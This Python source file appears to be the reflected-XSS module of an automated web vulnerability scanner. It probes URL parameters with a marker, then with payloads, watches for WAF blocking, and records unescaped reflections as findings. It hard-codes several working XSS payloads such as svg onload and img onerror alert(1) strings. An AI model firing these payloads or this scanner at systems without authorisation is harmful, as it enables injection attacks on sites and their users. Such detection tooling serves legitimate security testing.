from __future__ import annotations

import asyncio
import hashlib
import urllib.parse

from .common import Finding, ScanContext, VulnerabilityModule, run_bounded, url_with_params
from .adaptive_guard import AdaptiveResponseGuard
from .payload_utils import xss_payloads


class XssModule(VulnerabilityModule):
    name = "xss"
    ZERO_TOUCH_PAYLOADS_PER_INPUT = 48

    DEFAULT_PARAMS = [
        "q",
        "search",
        "query",
        "keyword",
        "name",
        "msg",
        "message",
        "text",
        "comment",
        "title",
        "redirect",
        "next",
    ]

    DEFAULT_PAYLOADS = [
        "titan-xss\"><svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "'><details open ontoggle=alert(1)>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "\"><svg><animate onbegin=alert(1) attributeName=x>",
    ]

    async def run(self, ctx: ScanContext) -> list[Finding]:
        budget = max(1, ctx.limits.max_tests_per_module)
        deep = str(ctx.policy.profile or "").lower() == "deep"
        candidates = self._candidate_urls(ctx)
        findings: list[Finding] = []
        tested = 0
        local_lock = asyncio.Lock()
        reflected_inputs: list[tuple[str, str]] = []
        confirmed_inputs: set[tuple[str, str]] = set()
        guard = AdaptiveResponseGuard(
            block_threshold=ctx.limits.adaptive_waf_block_threshold,
            plateau_threshold=ctx.limits.adaptive_plateau_threshold,
        )

        inputs = [(url, param) for url, params in candidates for param in params[:10]]

        async def reflection_probe(spec: tuple[str, str]) -> None:
            nonlocal tested
            url, param = spec
            input_key = f"{url}|{param}"
            if guard.stop_module:
                return
            marker = "scan_titan_reflect_" + hashlib.sha1(f"{url}|{param}".encode()).hexdigest()[:12]
            result = await ctx.http.request("GET", url, params={param: marker})
            reflects = bool(
                result
                and int(result.status or 0) < 400
                and ("html" in result.content_type.lower() or "text" in result.content_type.lower())
                and marker in result.text
            )
            decision = guard.observe(
                result,
                input_key=input_key,
                probe_value=marker,
                positive_signal=reflects,
            )
            async with local_lock:
                tested += 1
                if reflects and not decision.blocked:
                    reflected_inputs.append(spec)
                if decision.stop_module:
                    ctx.heartbeat(self.name, decision.reason, tested, len(findings))
                elif tested == 1 or tested % 20 == 0 or tested == len(inputs):
                    ctx.heartbeat(self.name, f"fase=reflexion {param}", tested, len(findings))

        # Etapa 1: un marcador inocuo descarta parametros que no reflejan. Solo
        # los positivos pasan a payloads de contexto, evitando fuzzing ciego.
        await run_bounded(
            inputs[:budget],
            reflection_probe,
            limit=8,
            should_stop=lambda: ctx.should_stop() or guard.stop_module,
        )

        remaining = max(0, budget - tested)
        payload_limit = remaining if deep else min(remaining, self.ZERO_TOUCH_PAYLOADS_PER_INPUT)
        payloads = xss_payloads(
            ctx.wordlists,
            self.DEFAULT_PAYLOADS,
            limit=max(len(self.DEFAULT_PAYLOADS), payload_limit),
        )[:payload_limit] if reflected_inputs and remaining else []

        async def probe(url: str, param: str, payload: str) -> None:
            nonlocal tested
            key = (url, param)
            input_key = f"{url}|{param}"
            if key in confirmed_inputs or guard.stop_module or guard.input_stopped(input_key):
                return
            result = await ctx.http.request("GET", url, params={param: payload})
            content_type = result.content_type.lower() if result else ""
            positive = bool(
                result
                and ("html" in content_type or "text" in content_type)
                and payload in result.text
                and payload.replace("<", "&lt;").replace(">", "&gt;") not in result.text
            )
            decision = guard.observe(
                result,
                input_key=input_key,
                probe_value=payload,
                positive_signal=positive,
            )
            async with local_lock:
                tested += 1
                if decision.stop_module or decision.stop_input:
                    ctx.heartbeat(self.name, decision.reason, tested, len(findings))
                elif tested == 1 or tested % 20 == 0 or tested >= budget:
                    ctx.heartbeat(self.name, f"fase=payload {param}={payload[:28]}", tested, len(findings))
            if not result or decision.blocked:
                return
            if "html" not in content_type and "text" not in content_type:
                return
            escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
            if payload in result.text and escaped not in result.text:
                async with local_lock:
                    if key in confirmed_inputs:
                        return
                    confirmed_inputs.add(key)
                    findings.append(
                        Finding(
                            target=ctx.target.display,
                            category="XSS",
                            severity="High",
                            title=f"Reflected XSS candidate: {param}",
                            url=url_with_params(url, {param: payload}),
                            endpoint=urllib.parse.urlparse(url).path or "/",
                            param=param,
                            method="GET",
                            payload=payload,
                            status=str(result.status),
                            size=f"{result.body_len}b",
                            elapsed=f"{result.elapsed:.2f}s",
                            evidence="Payload reflected without HTML escaping.",
                            source=self.name,
                            confidence="high",
                        )
                    )

        specs = []
        for payload in payloads:
            for url, param in reflected_inputs:
                if len(specs) >= remaining:
                    break
                specs.append((url, param, payload))
            if len(specs) >= remaining:
                break

        async def run_probe(spec: tuple[str, str, str]) -> None:
            await probe(*spec)

        await run_bounded(
            specs,
            run_probe,
            limit=8,
            should_stop=lambda: ctx.should_stop() or guard.stop_module,
        )
        ctx.recon["xss_active_completed"] = True
        ctx.recon["xss_active_summary"] = {
            "inputs": len(inputs),
            "reflected_inputs": len(reflected_inputs),
            "payload_probes": max(0, tested - min(len(inputs), budget)),
            "tested": tested,
            "findings": len(findings),
            "adaptive_guard": guard.summary(),
        }
        self._record_guard(ctx, guard)
        return findings

    @staticmethod
    def _record_guard(ctx: ScanContext, guard: AdaptiveResponseGuard) -> None:
        summary = guard.summary()
        if not summary["module_stopped"] and not summary["stopped_inputs"]:
            return
        ctx.recon["adaptive_stops"] = list(ctx.recon.get("adaptive_stops", [])) + [
            {"module": "xss", **summary}
        ]
        if summary["waf_vendor"]:
            ctx.recon["waf_cdn"] = sorted(
                set(ctx.recon.get("waf_cdn", []) + [summary["waf_vendor"]])
            )

    def _candidate_urls(self, ctx: ScanContext) -> list[tuple[str, list[str]]]:
        parsed_target = urllib.parse.urlparse(ctx.target.url)
        target_params = [name for name, _value in urllib.parse.parse_qsl(parsed_target.query)]
        candidates = [(ctx.target.url, target_params)] if target_params else []
        for endpoint in ctx.recon.get("endpoints", [])[:40]:
            url = endpoint.get("url")
            params = endpoint.get("params") or []
            if url and params:
                candidates.append((url, [str(param) for param in params if str(param).strip()]))
        if not candidates:
            candidates = [(ctx.target.url, self.DEFAULT_PARAMS)]
        seen = set()
        unique = []
        for url, params in candidates:
            key = (url, ",".join(sorted(params)))
            if key in seen:
                continue
            seen.add(key)
            unique.append((url, params))
        return unique
